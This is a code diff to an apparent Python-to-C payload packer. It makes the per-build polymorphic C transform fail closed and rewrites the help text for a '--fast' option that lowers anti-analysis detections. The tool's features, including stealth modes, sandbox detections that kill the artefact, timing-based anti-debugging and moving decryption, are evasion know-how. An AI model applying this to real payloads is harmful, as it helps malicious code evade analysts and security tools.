@@ -1483,13 +1483,26 @@ def build_local_cython(source_content, target_python=None):
             print(" [!] Cython did not produce payload.c")
             return None, None
         # Transform the generated C (polymorphic per build).
+        #
+        # FAIL CLOSED (audit 2026-11-17): this used to swallow every
+        # exception and continue, so a broken transform shipped
+        # UNTRANSFORMED C with only a log line -- the one default-on
+        # protection in the project that failed open. Every other gate
+        # kills or refuses; this one now does too. A transform that cannot
+        # run is a build failure, not a warning.
+        from scripts.c_transform import transform_file as _c_tf
+        _c_seed = os.urandom(32)
         try:
-            from scripts.c_transform import transform_file as _c_tf
-            _c_seed = os.urandom(32)
             _ct = _c_tf(c_path, _c_seed)
-            print(f"    [+] C transform: {_ct.transforms_applied}")
         except Exception as _ct_exc:
-            print(f"    [!] C transform skipped: {_ct_exc}")
+            print(f"    [!] C transform FAILED: {_ct_exc}")
+            print("    [!] Refusing to ship untransformed C (fail closed).")
+            return None, None
+        if not _ct.transforms_applied:
+            print("    [!] C transform applied NOTHING to the generated C.")
+            print("    [!] Refusing to ship untransformed C (fail closed).")
+            return None, None
+        print(f"    [+] C transform: {_ct.transforms_applied}")
         gcc_cmd = [
             sys.executable, "-c",
             "import sysconfig, subprocess, sys; "
@@ -5572,9 +5585,13 @@ def build_parser():
                             "there is no enable flag. Pass this only to LOWER "
                             "the intensity (stealth or balanced)")
     build.add_argument('--fast', dest='strict_detections', action='store_false',
-                       help="Build the reduced-protection profile: detections only "
-                            "warn, entropy noise and rdtsc pressure are lower. "
-                            "Faster builds and faster artefacts; weaker posture.")
+                       help="Make the environment detections WARN instead of "
+                            "kill (the one thing this changes: measured, the "
+                            "identity gate, self-check, interpreter gate, "
+                            "section pack, moving decryption, honeypayload and "
+                            "split bootstrap all stay ON). Use it only where a "
+                            "false-positive kill would be worse than a missed "
+                            "detection.")
     build.add_argument('--debug-dump-raw', dest='debug_dump_raw',
                        action='store_true', default=False,
                        help='Compile the plaintext-dump debug aid into the artifact '
